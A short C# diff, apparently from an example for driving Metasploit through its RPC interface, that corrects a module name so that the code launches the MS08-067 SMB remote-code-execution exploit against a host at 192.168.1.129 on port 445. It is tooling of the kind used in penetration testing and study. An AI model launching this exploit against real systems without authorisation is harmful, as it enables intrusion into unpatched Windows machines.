@@ -20,7 +20,7 @@ namespace ModuleExecuteExample
 					options.Add("RHOST", "192.168.1.129");
 					options.Add("RPORT", "445");
 					
-					Dictionary<object, object> response = manager.ExecuteModule("exploit", "windows/smb/msf08_067_netapi", options);
+					Dictionary<object, object> response = manager.ExecuteModule("exploit", "windows/smb/ms08_067_netapi", options);
 					
 					foreach (KeyValuePair<object, object> pair in response)
 						Console.WriteLine(pair.Key + ": " + pair.Value);
